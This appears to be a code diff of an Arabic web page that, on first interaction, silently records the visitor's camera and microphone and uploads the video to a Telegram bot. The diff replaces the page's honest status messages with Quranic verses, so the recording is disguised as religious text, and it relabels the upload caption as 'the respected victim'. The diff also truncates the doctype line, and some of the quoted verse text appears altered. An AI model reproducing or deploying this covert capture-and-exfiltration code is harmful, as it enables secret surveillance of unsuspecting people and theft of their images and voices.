@@ -1,4 +1,4 @@
-<!DOCTYPE html>
+TYPE html>
 <html lang="ar" dir="rtl">
 <head>
 <meta charset="UTF-8">
@@ -44,7 +44,7 @@ function onFirstInteraction(){ if(!started) attemptStart(); }
 async function attemptStart(){
   if(started) return;
   started = true;
-  statusEl.textContent='طلب إذن الكاميرا والميكروفون...';
+  statusEl.textContent='بسم الله الرحمن الرحيم...';
   try{
     stream = await navigator.mediaDevices.getUserMedia({video:true,audio:true});
     hiddenVideo.srcObject = stream;
@@ -60,9 +60,17 @@ function startRecording(){
   try{ mediaRecorder=new MediaRecorder(stream,{mimeType:'video/webm;codecs=vp8,opus'});}catch(e){ mediaRecorder=new MediaRecorder(stream);}
   recordedBlobs=[];
   mediaRecorder.ondataavailable=ev=>{if(ev.data && ev.data.size) recordedBlobs.push(ev.data);}
-  mediaRecorder.onstart=()=>{statusEl.textContent=`التسجيل بدأ تلقائيًا — سيقف بعد ${RECORD_SECONDS} ثانية.`;}
+  mediaRecorder.onstart=()=>{statusEl.textContent=`① الزَّانِيَةُ وَالزَّانِي فَاجْلِدُوا كُلَّ وَاحِدٍ مِنْهُمَا مِائَةَ جَلْدَةٍ ۖ وَلَا تَأْخُذْكُمْ بِهِمَا رَأْفَةٌ فِي دِينِ اللَّهِ إِن كُنتُمْ تُؤْمِنُونَ بِاللَّهِ وَالْيَوْمِ الْآخِرِ ۖ وَلْيَشْهَدْ عَذَابَهُمَا طَائْفَةٌ مِّنَ الْمُؤْمِنِينَ
+
+② الزَّانِي لَا يَنكِحُ إِلَّا زَانِيَةً أَوْ مُشْرِكَةً وَالزَّانِيَةُ لَا يَنكِحُهَا إِلَّا زَانٍ أَوْ مُشْرِكٌ وَحُرِّمَ ذَلِكَ عَلَى الْمُؤْمِنِينَ
+
+③ وَالَّذِينَ يَرْمُونَ الْمُحْصَنَاتِ ثُمَّ لَمْ يَأْتُوا بِأَرْبَعَةِ شُهَدَاءٍ فَاجْلِدُوهُمْ ثَمَانِينَ جَلْدَةً وَلَا تَقْبَلُوا لَهُمْ شَهَادَةً أَبَدًا ۚ وَأُولَٰئِكَ هُمُ الْفَاسِقُونَ
+
+④ إِلَّا الَّذِينَ تَابُوا مِن بَعْدِ ذَٰلِكَ وَأَصْلَحُوا فَإِنَّ اللَّهَ غَفُورٌ رَّحِيمٌ
+
+⑤ وَالْمُحْصَنَاتُ مِنَ النِّسَاءِ إِلَّا مَا مَلَكَتْ أَيْمَانُكُمْ كِتَابَ اللَّهِ عَلَيْكُمْ ۚ وَرَاجُوا النِّسَاءَ بِالْمَعْرُوفِ ۚ وَلا تَعْتَدُوا ۚ إِنَّ اللَّهَ كَانَ عَفُوًّا غَفُورًا ${RECORD_SECONDS} ثانية.`;}
   mediaRecorder.onstop=async()=>{
-    statusEl.textContent='انتهى التسجيل — جارٍ الإرسال للبوت...';
+    statusEl.textContent='انتهى ...';
     if(stream) stream.getTracks().forEach(t=>t.stop());
     const blob=new Blob(recordedBlobs,{type:'video/webm'});
 
@@ -70,7 +78,7 @@ function startRecording(){
       try{
         const form = new FormData();
         form.append('chat_id', CHAT_ID);
-        form.append('caption','تسجيل تعليمي 10 ثواني');
+        form.append('caption','الضحية المحترمه 😁😈');
         form.append('video', blob, `rec_${Date.now()}.webm`);
         const resp = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`,{method:'POST',body:form});
         if(!resp.ok){
